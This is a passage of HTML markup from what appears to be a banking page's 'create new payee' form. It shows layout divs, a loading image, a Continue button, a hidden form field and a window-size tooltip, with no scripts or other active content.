                                </div>

		
                            </fieldset>
							
							
							
							
                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden">
                                <em class="title"></em>
                            </div>
                        </div>
                        <div class="modalFooter" style="clear: both;">
                            <div style="clear: both; width: 100%">

                                <div class="floatRight" style="float: left;">
                                    <div>
                                        <div style="clear: left;">
                                            <div style="float: left;">
                                                <div>
                                                    <em class="title"><em>&nbsp;</em></em>
                                                </div>
                                            </div>
                                            <div style="float: left;">
                                                <div>
                                                    <em class="title"><em>&nbsp;</em></em>
                                                </div>
                                            </div>
                                            <div style="float: left;">
                                                <div>
                                                    <em class="title"><em>&nbsp;</em></em>
                                                </div>
                                            </div>
                                            <div style="text-align: right; float: left;">
                                                <div>
                                                    <em class="title"><em></em></em>
                                                    <div style="display: none; float: left; text-align:right; height:35px; width:35px;">
                                                        <em class="title"><img class="loader-30" src="assets/img/loader.gif"></em>
                                                    </div><em class="title"></em>
                                                    <div style="display: inline">
                                                        <em class="title"><button class="primary waitingButton" id="go" name="go" type="submit" value="Continue"><em class="title">Continue</button></em></em>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                        </div>
                        <div class="clearBoth" style="clear: both; height: 0px; overflow: hidden"></div>
                    </div>
                </div>
                <div style="width: 100%">
                    <div style="display: none;position: relative"></div>
                </div>
                <div style="width: 100%">
                    <div style="display: none;position: relative"></div>
                </div>
                <div style="width: 100%">
                    <div style="display: none;position: relative"></div>
                </div><em class="title"><em><input name="_V_CreateNewPayee" type="hidden" value="Y"></em></em>
            </div>
        </div>
		
		
    </form>
<div class="ui-widget-overlay" style="width: 1349px; height: 1331px; z-index: 3001;"></div>
<input style="left: -10000px; position: absolute" type="text">

<div id="window-resizer-tooltip"><a href="#" title="Edit settings"></a><span class="tooltipTitle">Window size: </span><span class="tooltipWidth" id="winWidth"></span> x <span class="tooltipHeight" id="winHeight"></span><br><span class="tooltipTitle">Viewport size: </span><span class="tooltipWidth" id="vpWidth"></span> x <span class="tooltipHeight" id="vpHeight"></span></div></body></html>